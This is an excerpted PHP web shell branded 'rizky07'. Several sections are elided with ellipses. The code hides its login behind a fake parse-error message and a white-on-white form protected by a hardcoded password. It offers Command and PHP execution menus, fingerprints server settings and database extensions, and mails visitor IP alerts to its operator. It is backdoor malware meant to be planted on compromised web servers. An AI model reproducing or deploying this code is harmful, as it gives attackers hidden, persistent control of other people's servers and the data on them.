...
$error = "<b>Parse error</b>: syntax error, unexpected ''; ' (T_ENCAPSED_AND_WHITESPACE), expecting";
$password = "cepot"; 
...
echo '<center><form method="post"><body bgcolor=black><input type="password" name="password" style="height:15px;margin-top:4px;width:200px;background:black;color:lime;border:1px solid blue;padding:2px;padding:14px 10px;text-align:center;font-size:20px;"/></body>';
}else{
header('HTTP/1.1 500 Internal Error');
die();
}
if($_POST['password'] != $password){
echo '<script>alert("salah asu");</script>';
	}
...
$safe_mode = ($safe_mode) ? ('<font color:crimson>ON</font>') : ('<font color=crimson>OFF</font>');
$cwd = getcwd();
$bckC = '#333333';
$txtC = '#999999';
$start='<html>
...
</style><script type="text/javascript">function get_inf() {
	if(document.getElementById(\'moreI\').style.display=="block") {
...
<body>
<h1 id="n"><a href="?x=7">rizky07</a></h1>';
$menu='<center><p id="menu"><span id="menuB">
<a href="'.$me.'">| Home</a>
<a href="?x=cmd&d="'.realpath('.').'">| Command</a>
<a href="?x=php&d="'.realpath('.').'">| PHP</a>
<a href="javascript:get_inf();">| Info</a>
<a href="?x=q">| Logout |</a>
</span></p></center>';$end='</body></html>';$inf='<center><p id="inf">  <b><i><u>software:</u></i></b> '.$server_soft.'    <b><i><u>system:</u></i></b> '.$uname.' </br> <b><i><u>user:</u></i></b> '.$cur_user.'  <b><i><u>safe mode:</u></i></b> '.$safe_mode.'  <b><i><u>directory: </i></b></u>'.$cwd.' </p></center><hr>';
...
mail($mail, "h3h3h", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
if(isset($_REQUEST['x']))
{
	...
	switch($_REQUEST['x'])
	{
		...
		case '7': print '</br></br></br><center><h1 id="nm">hello< /></h1><h3>Mail: <a href="mailto:tradisiaing@gmail.com">tradisiaing@gmail.com</a></h3></center>';break;
	}
}
else
{
...
function openbase_dir(){$x=ini_get('open_basedir');if(!$x) {$o='<font color=green>OFF</font>';}else {$o='<font color=crimson>ON</font>';}return($o);}
function magic_quotes(){$x=get_magic_quotes_gpc();if(empty($x)) {$m='<font color=green>OFF</font>';}else {$m='<font color=crimson>ON</font>';}return($m);}
function curl(){if(extension_loaded('curl')) {$c='<font color=crimson>ON</font>';}else {$c='<font color=green>OFF</font>';}return($c);}
function reg_globals(){if(ini_get('reqister_globals')) {$r='<font color=crimson>ON</font>';}else {$r='<font color=green>OFF</font>';}return($r);}
function oracle(){if(function_exists('ocilogon')) {$o='<font color=crimson>ON</font>';}else {$o='<font color=green>OFF</font>';}return($o);}
function postgresql(){if(function_exists('pg_connect')) {$p='<font color=crimson>ON</font>';}else {$p='<font color=green>OFF</font>';}return($p);}
function myql(){if(function_exists('mysql_connect')) {$m='<font color=crimson>ON</font>';}else {$m='<font color=green>OFF</font>';}return($m);}
function mssql(){if(function_exists('mssql_connect')) {$m='<font color=crimson>ON</font>';}else {$m='<font color=green>OFF</font>';}return($m);}
function gzip(){if(function_exists('gzencode')) {$m='<font color=crimson>ON</font>';}else {$m='<font color=green>OFF</font>';}return($m);}
...
function initiate(){print '<table border=0 width=100% height=100% align=center style="background:white;color:white;"><td valign="middle"><center><form action="'.basename(__FILE__).'" method="POST"><input type="password" maxlength="10" name="pass" style="background:white;color:white;border-radius:10px;border:1px solid silver;text-align:center;"> <input type="submit" value=">></form></center></td></table>';}
